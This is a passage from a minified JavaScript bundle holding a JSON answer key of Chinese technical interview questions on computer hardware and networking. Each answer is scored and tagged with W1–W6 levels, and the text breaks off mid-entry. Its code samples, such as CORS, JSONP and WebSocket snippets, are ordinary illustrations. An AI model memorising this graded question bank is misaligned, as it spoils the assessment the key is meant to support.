Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(e=>[e.toLowerCase(),e]));c.B,c.BIG,c.BLOCKQUOTE,c.BODY,c.BR,c.CENTER,c.CODE,c.DD,c.DIV,c.DL,c.DT,c.EM,c.EMBED,c.H1,c.H2,c.H3,c.H4,c.H5,c.H6,c.HEAD,c.HR,c.I,c.IMG,c.LI,c.LISTING,c.MENU,c.META,c.NOBR,c.OL,c.P,c.PRE,c.RUBY,c.S,c.SMALL,c.SPAN,c.STRONG,c.STRIKE,c.SUB,c.SUP,c.TABLE,c.TT,c.U,c.UL,c.VAR;var Yn;(function(e){e[e.INITIAL=0]="INITIAL",e[e.BEFORE_HTML=1]="BEFORE_HTML",e[e.BEFORE_HEAD=2]="BEFORE_HEAD",e[e.IN_HEAD=3]="IN_HEAD",e[e.IN_HEAD_NO_SCRIPT=4]="IN_HEAD_NO_SCRIPT",e[e.AFTER_HEAD=5]="AFTER_HEAD",e[e.IN_BODY=6]="IN_BODY",e[e.TEXT=7]="TEXT",e[e.IN_TABLE=8]="IN_TABLE",e[e.IN_TABLE_TEXT=9]="IN_TABLE_TEXT",e[e.IN_CAPTION=10]="IN_CAPTION",e[e.IN_COLUMN_GROUP=11]="IN_COLUMN_GROUP",e[e.IN_TABLE_BODY=12]="IN_TABLE_BODY",e[e.IN_ROW=13]="IN_ROW",e[e.IN_CELL=14]="IN_CELL",e[e.IN_SELECT=15]="IN_SELECT",e[e.IN_SELECT_IN_TABLE=16]="IN_SELECT_IN_TABLE",e[e.IN_TEMPLATE=17]="IN_TEMPLATE",e[e.AFTER_BODY=18]="AFTER_BODY",e[e.IN_FRAMESET=19]="IN_FRAMESET",e[e.AFTER_FRAMESET=20]="AFTER_FRAMESET",e[e.AFTER_AFTER_BODY=21]="AFTER_AFTER_BODY",e[e.AFTER_AFTER_FRAMESET=22]="AFTER_AFTER_FRAMESET"})(Yn||(Yn={}));c.TABLE,c.TBODY,c.TFOOT,c.THEAD,c.TR;c.CAPTION,c.COL,c.COLGROUP,c.TBODY,c.TD,c.TFOOT,c.TH,c.THEAD,c.TR;x.AREA,x.BASE,x.BASEFONT,x.BGSOUND,x.BR,x.COL,x.EMBED,x.FRAME,x.HR,x.IMG,x.INPUT,x.KEYGEN,x.LINK,x.META,x.PARAM,x.SOURCE,x.TRACK,x.WBR;const Xp=JSON.parse('[{"key":"计算机硬件","content":"<h1>计算机硬件</h1>\\n<h2>请解释一下什么是处理器架构（CPU Architecture）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。</li>\\n</ul>\\n<h2>指令集（Instruction Set）是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。</li>\\n</ul>\\n<h2>热插拔（Hot Swap）是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。</li>\\n</ul>\\n<h2>什么是多核处理器（Multi-Core Processor）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。</li>\\n</ul>\\n<h2>虚拟化（Virtualization）是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 计算机硬件\\n\\n","depth":1,"text":"计算机硬件","tokens":[{"type":"text","raw":"计算机硬件","text":"计算机硬件","escaped":false}]},{"type":"heading","raw":"## 请解释一下什么是处理器架构（CPU Architecture）？\\n\\n","depth":2,"text":"请解释一下什么是处理器架构（CPU Architecture）？","tokens":[{"type":"text","raw":"请解释一下什么是处理器架构（CPU Architecture）？","text":"请解释一下什么是处理器架构（CPU Architecture）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","task":false,"loose":false,"text":"**1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","tokens":[{"type":"text","raw":"**1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","text":"**1：** 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","text":" 处理器架构指的是处理器的设计模式和实现原理，比如采用的指令集架构、处理器内部的结构、对内存的访问方式等。不同的处理器架构会对编写和运行程序等方面产生影响。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 指令集（Instruction Set）是什么？\\n\\n","depth":2,"text":"指令集（Instruction Set）是什么？","tokens":[{"type":"text","raw":"指令集（Instruction Set）是什么？","text":"指令集（Instruction Set）是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","task":false,"loose":false,"text":"**1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","tokens":[{"type":"text","raw":"**1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","text":"**1：** 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","text":" 指令集是CPU能够执行的指令的集合。不同的处理器架构会采用不同的指令集，包括x86、ARM、MIPS等。程序员需要了解所编写代码所运行的处理器架构和指令集，以确保代码的正确性和性能优化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 热插拔（Hot Swap）是什么？\\n\\n","depth":2,"text":"热插拔（Hot Swap）是什么？","tokens":[{"type":"text","raw":"热插拔（Hot Swap）是什么？","text":"热插拔（Hot Swap）是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","task":false,"loose":false,"text":"**1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","tokens":[{"type":"text","raw":"**1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","text":"**1：** 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","text":" 热插拔是指在不关闭计算机或不停止运行程序的情况下，可以插入或拔出硬件设备，如USB存储器、硬盘，而不会影响计算机的运行。这项技术对于服务器等需要24小时不间断运行的环境尤为重要。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是多核处理器（Multi-Core Processor）？\\n\\n","depth":2,"text":"什么是多核处理器（Multi-Core Processor）？","tokens":[{"type":"text","raw":"什么是多核处理器（Multi-Core Processor）？","text":"什么是多核处理器（Multi-Core Processor）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","task":false,"loose":false,"text":"**1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","tokens":[{"type":"text","raw":"**1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","text":"**1：** 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","text":" 多核处理器指的是在一块芯片上集成了多个CPU核心。这意味着同一时间可以进行多个进程或线程的并行处理，从而提高计算能力和程序运行速度。在编写程序时，需要考虑线程和进程的并行化实现。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 虚拟化（Virtualization）是什么？\\n\\n","depth":2,"text":"虚拟化（Virtualization）是什么？","tokens":[{"type":"text","raw":"虚拟化（Virtualization）是什么？","text":"虚拟化（Virtualization）是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","task":false,"loose":false,"text":"**1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","tokens":[{"type":"text","raw":"**1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","text":"**1：** 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","text":" 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。","escaped":false}]}]}]}]},{"key":"计算机网络","content":"<h1>计算机网络</h1>\\n<h2>网络协议是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在计算机网络要做到井井有条的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式、是否需要发送一个应答信息。这些规则被称为网络协议。</li>\\n</ul>\\n<h2>什么是TCP/IP和UDP</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> TCP/IP即传输控制/网络协议，是面向连接的协议，发送数据前要先建立连接(发送方和接收方的成对的两个之间必须建 立连接)，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达</li>\\n<li><strong>1：</strong> UDP它是属于TCP/IP协议族中的一种。是无连接的协议，发送数据前不需要建立连接，是没有可靠性的协议。因为不需要建立连接所以可以在在网络上以任何可能的路径传输，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的</li>\\n</ul>\\n<h2>TCP与UDP区别是什么</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<ul>\\n<li><strong>1：</strong> TCP是面向连接的协议，发送数据前要先建立连接，TCP提供可靠的服务，也就是说，通过TCP连接传输的数据不会丢失，没有重复，并且按顺序到达</li>\\n<li><strong>1：</strong> UDP是无连接的协议，发送数据前不需要建立连接，是没有可靠性；</li>\\n<li><strong>1：</strong> TCP通信类似于于要打个电话，接通了，确认身份后，才开始进行通行；</li>\\n<li><strong>1：</strong> UDP通信类似于学校广播，靠着广播播报直接进行通信。</li>\\n<li><strong>1：</strong> TCP只支持点对点通信，UDP支持一对一、一对多、多对一、多对多；</li>\\n<li><strong>1：</strong> TCP是面向字节流的，UDP是面向报文的； 面向字节流是指发送数据时以字节为单位，一个数据包可以拆分成若干组进行发送，而UDP一个报文只能一次发完。</li>\\n<li><strong>1：</strong> TCP首部开销（20字节）比UDP首部开销（8字节）要大</li>\\n<li><strong>1：</strong> UDP 的主机不需要维持复杂的连接状态表</li>\\n</ul>\\n<h2>HTTP和HTTPS的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 安全性：</p>\\n<ul>\\n<li>HTTP是明文传输，数据可能被窃听和篡改</li>\\n<li>HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 端口：</p>\\n<ul>\\n<li>HTTP默认使用80端口</li>\\n<li>HTTPS默认使用443端口</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 证书：</p>\\n<ul>\\n<li>HTTP不需要证书</li>\\n<li>HTTPS需要CA机构颁发的SSL证书</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 性能：</p>\\n<ul>\\n<li>HTTP性能更好，因为没有加密解密过程</li>\\n<li>HTTPS因为需要加密解密，性能会有所损耗</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用场景：</p>\\n<ul>\\n<li>HTTP适用于对安全要求不高的场景</li>\\n<li>HTTPS适用于需要保护用户隐私和数据安全的场景</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么是跨域？如何解决跨域问题？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 什么是跨域：</p>\\n<ul>\\n<li>浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求</li>\\n<li>同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> CORS（跨域资源共享）：</p>\\n<ul>\\n<li>使用场景：现代浏览器的首选跨域解决方案，适用于REST API</li>\\n<li>优点：支持所有类型的HTTP请求，配置灵活</li>\\n<li>缺点：需要服务器配合，老版本浏览器可能不支持</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">// 服务器端设置\\napp.use((req, res, next) =&gt; {\\n  res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;);\\n  res.header(&#39;Access-Control-Allow-Methods&#39;, &#39;GET,PUT,POST,DELETE&#39;);\\n  res.header(&#39;Access-Control-Allow-Headers&#39;, &#39;Content-Type&#39;);\\n  next();\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> JSONP：<ul>\\n<li>使用场景：兼容老版本浏览器，只需要GET请求的场景</li>\\n<li>优点：兼容性好，实现简单</li>\\n<li>缺点：只支持GET请求，可能存在安全问题</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">function jsonp(url, callback) {\\n  const script = document.createElement(&#39;script&#39;);\\n  script.src = `${url}?callback=${callback}`;\\n  document.body.appendChild(script);\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 代理服务器：<ul>\\n<li>使用场景：需要隐藏跨域细节，适合生产环境</li>\\n<li>优点：可以集中处理跨域问题，对前端透明</li>\\n<li>缺点：需要额外的服务器配置和维护</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">// nginx配置示例\\nlocation /api {\\n  proxy_pass http://backend-server;\\n  proxy_set_header Host $host;\\n  proxy_set_header X-Real-IP $remote_addr;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> postMessage：<ul>\\n<li>使用场景：iframe跨域通信，不同标签页通信</li>\\n<li>优点：可以实现跨窗口通信，安全性好</li>\\n<li>缺点：使用相对复杂，需要双方页面都进行相应处理</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">// 发送消息\\nwindow.postMessage(&#39;Hello&#39;, &#39;http://receiver.com&#39;);\\n\\n// 接收消息\\nwindow.addEventListener(&#39;message&#39;, (event) =&gt; {\\n  if (event.origin !== &#39;http://sender.com&#39;) return;\\n  console.log(event.data);\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> WebSocket：<ul>\\n<li>使用场景：需要实时双向通信的场景</li>\\n<li>优点：支持全双工通信，没有跨域限制</li>\\n<li>缺点：需要专门的服务器支持，协议和HTTP不同</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const ws = new WebSocket(&#39;ws://example.com&#39;);\\nws.onmessage = (event) =&gt; {\\n  console.log(event.data);\\n};\\n</code></pre>\\n<h2>OSI七层模型是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 应用层（第7层）：</p>\\n<ul>\\n<li>为应用程序提供网络服务</li>\\n<li>协议：HTTP、FTP、SMTP等</li>\\n<li>数据单位：消息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 表示层（第6层）：</p>\\n<ul>\\n<li>数据格式转换、加密解密</li>\\n<li>确保数据可以被接收方理解</li>\\n<li>数据单位：消息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 会话层（第5层）：</p>\\n<ul>\\n<li>建立、管理和终止会话</li>\\n<li>提供对话控制</li>\\n<li>数据单位：消息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 传输层（第4层）：</p>\\n<ul>\\n<li>端到端的可靠数据传输</li>\\n<li>协议：TCP、UDP</li>\\n<li>数据单位：段（TCP）、数据报（UDP）</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 网络层（第3层）：</p>\\n<ul>\\n<li>负责数据包的路由和转发</li>\\n<li>协议：IP、ICMP</li>\\n<li>数据单位：数据包</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 